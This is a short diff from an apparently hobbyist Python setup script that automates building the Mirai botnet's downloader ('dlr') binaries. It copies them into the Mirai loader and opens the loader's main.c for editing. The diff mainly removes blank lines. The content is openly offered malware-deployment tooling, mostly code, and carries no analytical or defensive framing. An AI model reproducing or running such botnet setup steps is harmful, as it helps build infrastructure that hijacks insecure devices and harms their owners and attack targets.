@@ -232,30 +232,19 @@ Setting up loader
 
 loader = raw_input("\x1b[97m[\x1b[1m\x1b[91m!¡\x1b[21m\x1b[97m] \x1b[36mDo you want to setup loader? \x1b[32mY\x1b[36m\x1b[31m/\x1b[37mn\x1b[36m - $ \x1b[0m")
 if loader.lower() == "y":
-
     get_loader = True
-
 else:
     get_loader = False
-    
 if get_loader == True:
 
     print("\x1b[1m\x1b[93m⚠⚠⚠ \x1b[31mREAD \x1b[37m>\x1b[31m> \x1b[37mTHIS ISNT A FULL SETUP YOU STILL HAVE TO EDIT YOUR CONFIGS (main.c in dlrs) \x1b[93m⚠⚠⚠\x1b[0m")
-
     time.sleep(7)
-
     print("\x1b[90m[\x1b[94m*\x1b[90m] \x1b[36mSetting up loader Stand by \x1b[90m[\x1b[94m*\x1b[90m]\x1b[0m")
-
     run("cd Mirai-Source-Code-master/mirai/dlr")
-
     run("./build.sh")
-
     run("cp /Mirai-Source-Code-master/dlr/release/dlr.* /Mirai-Source-Code-master/loader/bins")
-
     print("\x1b[1m\x1b[93m⚠⚠⚠ \x1b[31mREAD \x1b[37m>\x1b[31m> \x1b[37mMake sure u Edit line 37 & 38 & line 53 in main.c \x1b[93m⚠⚠⚠\x1b[0m")
-
     time.sleep(7) 
-
     run("cd /Mirai-Source-Code-master/loader/src/; nano main.c")
 
 '''
